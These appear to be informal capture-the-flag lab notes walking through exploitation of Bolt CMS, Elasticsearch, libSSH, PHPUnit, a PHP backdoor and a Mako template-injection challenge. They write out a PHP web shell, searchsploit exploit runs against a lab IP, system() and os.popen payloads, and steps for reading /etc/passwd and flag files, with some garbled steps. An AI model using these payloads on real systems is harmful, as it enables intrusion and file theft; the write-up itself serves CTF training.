Bolt - path traversal vulnerability as know as direct traversal attack allows hackers to open files they dont have access of 
1. view page saurce ( its written on bolt)
2. url/bolt
3. admin – password
4. file management – create file.txt enter - <?php echo system($_GET['cmd']);?>
5. rename flag.txt to file.php go to file
6. (url)php?cmd=ls -l
7. php?cmd=cat /flag.txt

Elastic ? - directory traversal is know as directory climbing it is caused because of http it help hackers to access not allowed directories
1. searchsploit elasticsearch 
ElasticSearch < 1.4.5 / < 1.5.2 - Directory Traversal (this sucks as well) cve-2015 5531
2. python exploit_elastic.py (link) /etc/passwd

Libssh - libSSH vulnerability (it allows attackers to access server without passwords )
1. searchsploit libssh
2. searchsploit -m linux/remote/... libSSH - Authentication Bypass (but saddly this sucks) cve 2018 10993
3. python3 file 34.141.12.127 31367 "cd ..;cat flag.txt"

Php unit - path traversal it helps hackers to read arbitrary files in the server 
1. $./dirsearch.py -u http://34.141.12.127:32017 -w ./db/dicc.txt
1. dirsearch -u url 
2. url /composer.json in here there is version of phpunit vulnerability 
3. /eval-stding.php // this is the one we are going to use for buirp suit
4. <?php system('cat /flag.txt')?>

Non-diff backdoor
1. Dirsearch -u url (Backup.zip) now we are going to search for backdoor this is written in php so lets find function which is written in php
2. Wget url/backup.zip lets download backup
3. cd backup 
4. Grep -r “shell_exec(“ //we will find function which says to us that we can use parameter welldone=knock to execute parameter shazam=injection
5. url?welldone=knockknock&shazam=id 
6. =cat flag.php
7. View page source

Shark - Vulnerability - Server Site Template Injection is when hacker can inject malicous code in web apps server template and than it might be executed which is bad for security
1. ${7*7} this is one of the template engines mathematical one to know if it has vulnerability 
curl -I (url) from here we can tell that servers is in werkzeug it has python version 3.6.9 and also has Server site template injection
2. Open burp browser i have to input something to trigger than that command last one
3. Submit something 
4. Name= 
<%
import os
x=os.popen(‘cat flag’).read()
%>
${x}
5. Send to Repeater
